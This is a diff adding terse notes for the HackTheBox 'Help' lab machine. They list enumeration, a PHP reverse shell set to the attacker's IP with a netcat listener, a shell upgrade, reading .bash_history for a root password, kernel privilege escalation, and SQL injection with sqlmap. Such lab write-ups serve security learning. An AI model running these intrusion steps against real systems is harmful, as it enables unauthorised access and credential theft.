@@ -1,0 +1,18 @@
+HackTheBox - HELP
+
+nmap -sC -sV -oA file IP
+gobuster -u http://IP -w directory-list.wordlist -o log.log
+searchsploit smth
+http://IP/support/README.md if open source
+searchsploit -x exploit (to examine)
+vim /usr/share/laudanum/php/php-reverse-shell.php with our IP
+nc -lvnp 9001
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm - ctrl-Z to background it - stty raw -echo
+.bash_history to see the root pass
+LinEnum.sh - kernel version kernel privesc (exploit-db)
+
+IP:port
+
+boolean based SQL injection
+sqlmap -r request.req --batch
